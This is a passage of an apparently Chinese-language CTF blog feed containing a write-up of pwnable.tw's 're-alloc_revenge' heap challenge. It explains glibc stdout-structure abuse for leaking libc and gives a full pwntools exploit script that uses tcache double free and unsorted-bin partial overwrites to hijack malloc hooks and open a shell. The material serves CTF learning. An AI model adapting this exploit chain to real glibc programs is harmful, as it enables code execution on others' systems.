<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p>
<ol>
<li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li>
<li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn heap: re-alloc_revenge</title>
    <url>/2020/03/18/pwn-heap-re-alloc-revenge/</url>
    <content><![CDATA[<p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>功能就不赘述了，因为binary和re-alloc一摸一样。</p>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow</span><br></pre></td></tr></table></figure>
<p>分析<code>_IO_new_file_overflow</code>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 跳过这个if分支，需要设置"fp-&gt;_flags | _IO_NO_WRITES"</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">// 跳过这个if分支，需要设置"fp-&gt;_flags | _IO_CURRENTLY_PUTTING"</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">            _IO_doallocbuf (f);</span><br><span class="line">            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	    &#123;</span><br><span class="line">            <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">            _IO_free_backup_area (f);</span><br><span class="line">            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">        <span class="comment">// 需要调用的目标"_IO_do_write"，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">        <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">        <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖"_IO_write_base"低字节为"\x00")</span></span><br><span class="line">        <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) </span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>_IO_new_file_overflow</code>中，我们要利用的就是其中的<code>_IO_do_write</code>。<br><br>在输出时，如果具有缓冲区，会输出<code>_IO_write_base</code>开始的缓冲区内容，直到<code>_IO_write_ptr</code>（也就是将<code>_IO_write_base</code>一直到<code>_IO_write_ptr</code>部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是libc中），但是在<code>setbuf</code>后，理论上会不使用缓冲区。然而如果能够修改<code>_IO_2_1_stdout_</code>结构体的<code>flags</code>部分，使得其认为<code>stdout</code>具有缓冲区，再将<code>_IO_write_base</code>处的值进行<code>partial overwrite</code>，就可以泄露出libc地址了。<br><br>为了设置对应的<code>flags</code>的值，需要进一步分析<code>_IO_do_write</code>(其实就是<code>_IO_new_do_write</code>)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (to_do == <span class="number">0</span> || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> size_t <span class="title">new_do_write</span> <span class="params">(FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// "_IO_SYSSEEK"只是简单的调用lseek，但是我们不能完全控制"fp-&gt;_IO_write_base - fp-&gt;_IO_read_end"的值。</span></span><br><span class="line">        <span class="comment">// 如果"fp-&gt;_IO_read_end"的值设置为0，那么"_IO_SYSSEEK"的第二个参数值就会过大;</span></span><br><span class="line">        <span class="comment">// 如果设置"fp-&gt;_IO_write_base = fp-&gt;_IO_read_end"的话，那么在其它地方就会有问题，因为"fp-&gt;_IO_write_base"不能大于"fp-&gt;_IO_write_end"。</span></span><br><span class="line">        <span class="comment">// 所以这里要设置"fp-&gt;_flags | _IO_IS_APPENDING"，避免进入else if分支。</span></span><br><span class="line">        <span class="keyword">off64_t</span> new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 需要的目标"_IO_SYSWRITE"</span></span><br><span class="line">    count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上可以得到，<code>flags</code>需要满足的条件为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>                 <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES           <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING    <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING         <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>
<p>同时可以将<code>_IO_read_ptr</code>, <code>_IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code>设置为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">_IO_read_end = <span class="number">0</span>;</span><br><span class="line">_IO_read_base = <span class="number">0</span>;</span><br><span class="line">_IO_write_base = <span class="number">0x7f</span>XXXXXXXX00;</span><br></pre></td></tr></table></figure>
<p>然后就可以根据输出的数据leak出libc地址了。</p>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li>利用<code>alloc</code>功能在<code>size=0</code>时存在的uaf，以及<code>realloc</code>中当<code>size &lt; old_size</code>而触发的<code>free(remainder)</code>操作，形成chunk overlap，然后覆盖chunk的size至足够放进unsorted bin中（这里因为要爆破而且连远程的延迟比较大，所以尽量小）。</li>
<li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br></pre></td></tr></table></figure></li>
<li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcache bin &#x3D;&#x3D;&gt; +--------+ &lt;--victim_chunk                      tcache bin &#x3D;&#x3D;&gt; +--------+&lt;--same victim_chunk</span><br><span class="line">                 |        |                   after malloc                      |        |</span><br><span class="line">                 +--------+&lt;--+            &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;                 +--------+</span><br><span class="line">                 |fd |    |   |                                                 |        |</span><br><span class="line">                 +--------+   |                                                 +--------+</span><br><span class="line">                   |          |</span><br><span class="line">                   +----------+</span><br></pre></td></tr></table></figure></li>
<li>进一步地，由于<code>alloc</code>会对输入地字符串强制添加末尾<code>\x00</code>，从而会将上一步中提到的double free链（也就是该tache bin的fd）的低字节覆盖为<code>\x00</code>，这里需要将该chunk的地址保持为低字节是<code>\x00</code>，从而即使低字节被覆盖也不影响double free链，而做法就是在最开始得时候分配一定size的chunk并free到tcache中去（其实这里的chunk在最后的exploite也会用到，因为那时unsorted bin已经被破坏了，不能分配tcache或者fastbin中没有的chunk，否则会造成从unsorted bin中取而报错）。</li>
<li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcache bin ==&gt; +--------+ &lt;--victim_chunk               |</span><br><span class="line">               |        |                               |</span><br><span class="line">               +--------+                               |****</span><br><span class="line">               |fd |    |                               |</span><br><span class="line">               +--------+                               |</span><br><span class="line">                 |                                      |</span><br><span class="line">                 +----------&gt; +--------+ &lt;--stdout      |</span><br><span class="line">                              |_flags  |                |</span><br><span class="line">                              +--------+                |</span><br><span class="line">                              |        |                |</span><br><span class="line">                              +--------+                |   after malloc</span><br><span class="line"> ----------------------------------------------------- +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdout</span><br><span class="line">unsorted bin ==&gt; +--------+ &lt;--same victim_chunk        |                                |_flags  |</span><br><span class="line">                 |        |                             |                                +--------+</span><br><span class="line">                 +--------+                             |                                |        |</span><br><span class="line">                 |fd | bk |--------&gt; main_arena         |                                +--------+        </span><br><span class="line">                 +--------+                             |                         </span><br><span class="line">                   |                                    |</span><br><span class="line">                   +----------&gt; +--------+ &lt;--stdout    |</span><br><span class="line">                                |_flags  |              |</span><br><span class="line">                                +--------+              |</span><br><span class="line">                                |        |              |</span><br><span class="line">                                +--------+              |</span><br></pre></td></tr></table></figure></li>
<li>这个时候只要分配stdout出的chunk就能修改相应的stdout结构体，达到输出数据从而leak libc的目的。</li>
<li>之后因为unsorted bin被破坏的缘故，并且仅能使用一个heap进行exploite（另一个heap不能被free，否则会报错）和只能通过bins中已有的chunk进行利用，分配到<code>__realloc_hook</code>处的chunk，将<code>__realloc_hook</code>改为<code>malloc</code>，再将<code>__malloc_hook</code>改为<code>one_gadget</code>（为了调整栈帧，使得<code>[rsp + 0x70] == NULL</code>。</li>
<li>触发<code>realloc</code>来getshell。</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x1e7570</span></span><br><span class="line">realloc_hook_offset = libc.symbols[<span class="string">"__realloc_hook"</span>]</span><br><span class="line">malloc_offset = libc.symbols[<span class="string">"malloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># make the lowest byte of bins[1]'s address be \x00</span></span><br><span class="line">        <span class="comment"># also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># three freed tcache bins size = [0x60, 0x40, 0x20]</span></span><br><span class="line">        <span class="comment"># bins[0] and bins[2] have the same address (both size area are 0x20)</span></span><br><span class="line">        <span class="comment"># bins[1] is right next to bins[0] and bins[2]</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make double free on bins[1]</span></span><br><span class="line">        <span class="comment"># thus we can use two same chunk on size 0x40 for the following exploit</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">        alloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc space for unsorted bin</span></span><br><span class="line">        <span class="comment"># make fake unstored bin's next chunk point to exactly a valid chunk</span></span><br><span class="line">        <span class="comment"># free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            alloc(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">            realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">            free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)</span></span><br><span class="line">        <span class="comment"># then alloc bins[1] and free it to unsorted bin</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x18</span> + p64(<span class="number">0x441</span>))</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)</span></span><br><span class="line">        <span class="comment"># make the tcache bins whose size is 0x40 point to stdout</span></span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x38</span>, p16(<span class="number">0x5760</span>))</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"DDDD"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc the chunk at stdout</span></span><br><span class="line">        <span class="comment"># make _flags = 0x7fdf0ec12760 ... to invoke data print</span></span><br><span class="line">        <span class="comment"># _flags = MAGIC                    # 0xfbad0000 </span></span><br><span class="line">        <span class="comment"># _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000 </span></span><br><span class="line">        <span class="comment"># _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800</span></span><br><span class="line">        <span class="comment"># _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800</span></span><br><span class="line">        <span class="comment"># _IO_read_ptr = 0, </span></span><br><span class="line">        <span class="comment"># _IO_read_end = 0, </span></span><br><span class="line">        <span class="comment"># _IO_read_base = 0</span></span><br><span class="line">        <span class="comment"># _IO_write_base = 0x7ffff7dd0700</span></span><br><span class="line">        <span class="comment"># _IO_write_ptr = 0x7ffff7dd07e3</span></span><br><span class="line">        <span class="comment"># thus data between _IO_write_base and _IO_write_ptr will be print out</span></span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak libc</span></span><br><span class="line">        string = p.recv(<span class="number">16</span>)</span><br><span class="line">        print(string)</span><br><span class="line">        <span class="keyword">if</span> string[<span class="number">0</span>] == <span class="string">"$"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10310</span>)</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        libc_addr = u64(string[<span class="number">8</span>:])</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        realloc_hook = libc_base + realloc_hook_offset</span><br><span class="line">        libc_malloc = libc_base + malloc_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10310</span>)</span><br><span class="line">        <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"realloc_hook: "</span> + hex(realloc_hook))</span><br><span class="line">success(<span class="string">"libc_malloc: "</span> + hex(libc_malloc))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># make heap[1] == NULL (cannot use heap[0] any more)</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the 0x80 tcache and prepared tcache</span></span><br><span class="line"><span class="comment"># create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addr</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + p64(<span class="number">0x51</span>) + p64(realloc_hook))</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make tcache bins in size 0x50 point to realloc_hook</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make realloc_hook = malloc, malloc_hook = one_gadget</span></span><br><span class="line"><span class="comment"># then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)</span></span><br><span class="line"><span class="comment"># because three "push"'s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL </span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, p64(libc_malloc) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use realloc to trigger</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use vps to get flag</span></span><br><span class="line"><span class="comment"># p.sendline("cat /home/re-alloc_revenge/flag")</span></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>新姿势，<code>unsorted bin-&gt;fd</code>的partial overwrite改成<code>stdout</code>，在没有show的情况下进行leak libc</li>
<li>只有两个heap外加只有realloc操作再加各种崩坏的unsorted bin和tcache double free check，以及需要bruteforce，调试+写exp的过程对我来说那叫一个…</li>
<li>貌似还有一种改tcache struct的做法，目前还没研究，以后有时间搞一下</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li>思路来源，但是貌似这个脚本有问题：<a href="http://www.ntype.club/re-alloc_revenge/" target="_blank" rel="noopener">http://www.ntype.club/re-alloc_revenge/</a></li>
<li>改tcache stuct的做法（还没学着调过）：<a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/</a></li>
<li>利用stdout进行输出：<a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md</a></li>
<li>同上：<a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></li>
<li>glibc2.29源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.29/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn rop: De-ASLR</title>
    <url>/2020/02/17/pwn-rop-De-ASLR/</url>
